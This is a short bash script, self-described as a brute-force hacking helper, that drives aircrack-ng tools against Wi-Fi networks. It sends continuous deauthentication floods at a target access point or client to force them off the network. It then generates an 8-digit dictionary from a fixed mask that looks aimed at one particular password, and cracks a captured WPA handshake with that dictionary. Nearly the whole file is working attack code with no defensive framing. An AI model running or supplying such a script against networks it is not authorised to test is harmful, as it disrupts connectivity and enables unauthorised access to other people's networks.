#!/bin/bash
export PATH=$PATH:/bin:/sbin:/usr/local/sbin:/usr/local/sbin
INTERFACE=""
AP_BSSID=""
STA=""
IF="crack-01.cap"
DIC=""

if [ "$EUID" -ne 0 ]
    then echo "Please run as super user"
    exit
fi


help(){
	echo "Brute Force Hacking Helper Script";
	echo "Options:"
	echo "i - Sets disassoc wireless interface";
	echo "b - Sets AP_BSSID for Filtering";
	echo "c - Sets Client Station MAC";
	echo "d - Disassociation of device";
	echo "g - Generate dictionary with crunch";
	echo "f - Brute Force password";
	1>&2; exit 1;
}

diasssoc(){
	if [ -z "${STA}" ]; then
		aireplay-ng -a $AP_BSSID --deauth 0 $INTERFACE;
	else
		aireplay-ng -a $AP_BSSID -c $STA --deauth 0 $INTERFACE;
	fi
}

pwd_gen(){
	crunch 8 8 1234567890 -t 25772@@@ -o $DIC;
}

crack_pwd(){
	aircrack-ng $IF -w $DIC;
}

while getopts "hsi:b:c:dg:f:" opt; do
    case "${opt}" in
    h)
        help
        exit 1;
        ;;
    i)	INTERFACE=${OPTARG}
	;;
    b)	AP_BSSID=${OPTARG};
	;;
    c)	STA=${OPTARG};
	;;
    d) 	diasssoc;
        exit 1;
      	;;
    g)  DIC=${OPTARG};
	pwd_gen;
	exit 1;
	;;
    f)	DIC=${OPTARG};
	crack_pwd;
	exit 1;
	;;

    esac
done

if [ $opt =  ? ]; then
	help;
	1>&2; exit 1;
fi
